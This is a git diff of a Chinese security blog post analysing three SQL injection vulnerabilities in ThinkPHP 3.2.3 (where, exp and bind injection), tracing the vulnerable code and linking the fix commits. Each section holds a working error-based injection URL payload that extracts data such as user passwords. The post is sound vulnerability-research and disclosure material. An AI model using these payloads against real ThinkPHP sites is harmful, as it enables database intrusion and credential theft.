@@ -1,25 +1,25 @@
 ---
 title: "Thinkphp3 漏洞总结"
 date: 2019-11-27T21:22:13+08:00
-lastmod: 2019-11-27T21:22:13+08:00
 draft: false
 tags: ['thinkphp','代码审计']
 categories: ['代码审计']
-comment: true
+series:
+- ThinkPHP
 ---
 
 先总结thinkphp3的漏洞
 
 <!--more-->
 
-# 写在前文
+## 写在前文
 
 - [Thinkphp3 开发手册](https://www.kancloud.cn/manual/thinkphp/1678)
 - [Thinkphp3.2.3 安全开发须知](https://xz.aliyun.com/t/2630)
 - [ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法](https://www.cnblogs.com/kenshinobiy/p/9165662.html)
 
-# thinkphp3.2.3 where注入
-## 基础
+## thinkphp3.2.3 where注入
+### 基础
 thinkphp3版本路由格式 
 ```
 http://php.local/thinkphp3.2.3/index.php/Home/Index/index/id/1
@@ -46,7 +46,7 @@ U URL动态生成和重定向方法
 W 快速Widget输出方法
 ```
 具体看 `ThinkPHP/Common/functions.php`
-## 配置环境
+### 配置环境
 首先配置好数据库
 ThinkPHP/Conf/convention.php
 ```php
@@ -150,7 +150,7 @@ E:.
 ```
 </details>
 
-## 配置控制器
+### 配置控制器
 Application/Home/Controller/IndexController.class.php
 ```php
 public function index()
@@ -161,11 +161,11 @@ var_dump($data);
 ```
 ![image](https://y4er.com/img/uploads/20191127224711.jpg)
 
-## payload
+### payload
 ```
-http://php.local/thinkphp3.2.3/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)#
+http://php.local/thinkphp3.2.3/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
 ```
-## 分析
+### 分析
 当我们简单传入`id=1'`时，跟着走一遍
 
 `I()`函数中获取参数，会经过`ThinkPHP/Common/functions.php:391` `htmlspecialchars()`进行处理，最后在`ThinkPHP/Common/functions.php:442`回调`think_filter`函数进行过滤
@@ -231,19 +231,19 @@ protected function _parseType(&$data, $key)
 if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join']))
 ```
 所以传入`index.php?id[where]=3 and 1=1`就可以注入了
-## 修复
+### 修复
 https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04
 ![image](https://y4er.com/img/uploads/20191127224820.jpg)
 
 `v3.2.4`将`$options`和`$this->options`进行了区分，从而传入的参数无法污染到`$this->options`，也就无法控制sql语句了。
 
-# thinkphp 3.2.3 exp注入
-## payload
+## thinkphp 3.2.3 exp注入
+### payload
 ![image](https://y4er.com/img/uploads/20191127227978.jpg)
 ```
 http://php.local/thinkphp3.2.3/index.php?username[0]=exp&username[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)
 ```
-## 环境
+### 环境
 ```php
 public function index()
 {
@@ -255,7 +255,7 @@ public function index()
 }
 ```
 我们使用全局数组传参，而不是`I()`函数。下文会解释
-## 分析
+### 分析
 打断点分析，`find()`函数会执行到`ThinkPHP/Library/Think/Model.class.php:822`的`$this->db->select($options)`
 ```php
 public function select($options = array())
@@ -341,17 +341,17 @@ function think_filter(&$value)
 }
 ```
 可以看到过滤了EXP字符串，会在后面拼接上一个空格，那这样后面`parseWhereItem()`中就不满足条件抛出异常导致无法注入。
-## 修复
+### 修复
 使用`I()`函数代替超全局数组获取变量
 
-# thinkphp 3.2.3 bind注入
+## thinkphp 3.2.3 bind注入
 上文中写到了exp注入，这篇讲bind注入
-## payload
+### payload
 ```
 http://php.local/thinkphp3.2.3/index.php?id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&password=1
 ```
 这里需要注意`id[1]=0`原理在下面说
-## 搭建环境
+### 搭建环境
 ```php
 public function index()
 {
@@ -391,7 +391,7 @@ if (!empty($this->bind)) {
 
 ![image](https://y4er.com/img/uploads/20191127227308.jpg)
 
-## 修复
+### 修复
 https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4
 
 ![image](https://y4er.com/img/uploads/20191127228454.jpg)
